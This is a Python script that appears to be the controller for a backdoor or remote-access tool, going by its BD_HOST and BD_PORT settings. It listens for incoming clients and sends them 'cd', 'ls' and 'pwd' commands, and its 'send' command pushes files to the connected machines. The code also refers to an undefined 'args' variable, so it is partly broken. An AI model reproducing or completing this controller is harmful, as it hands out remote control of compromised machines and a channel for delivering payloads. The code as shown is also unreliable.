import socket
import os
from threading import Thread

import models

HOST = str(os.environ.get("BD_HOST"))
PORT = int(os.environ.get("BD_PORT"))
server_socket = socket.socket()
server_socket.bind((HOST, PORT))
print('[+] Server Started')
clients = []
server_socket.listen(5)


def handle_command(userinput, client):
    command = userinput.split(" ")[0]
    cl = client.socket
    output = ""

    if command == "cd":
        cl.send(userinput.encode("UTF-8"))
        output = cl.recv(1024).decode()
        if not output == "Invalid Path!":
            client.pwd = output
    elif command == 'pwd':
        return client.pwd
    elif command == "ls":
        cl.send(userinput.encode("UTF-8"))
        output = cl.recv(1024)
        output = output.decode()
    elif command == "send":
        if len(args) > 0:
            if not client.get_file_by_name(args[0]) is None:
                cl.send(userinput.encode("UTF-8"))
                file = client.get_file_by_name(args[0])
                cl.sendall(file.data.getvalue())
                cl.send(b"<END>")
                output = cl.recv(1024).decode()
            else:
                output = "File not found!"
        else:
            output = "No args given!"

    else:
        output = "Unknown command! (help for help)"
    return output


def listen_for_clients():
    print("[+] Listening for Connections!")
    while True:
        client, client_addr = server_socket.accept()
        print(f'[+] {client_addr} Client connected to the server')
        pwd = client.recv(1024).decode()
        c = models.Client(pwd, client_addr, client)
        clients.append(c)
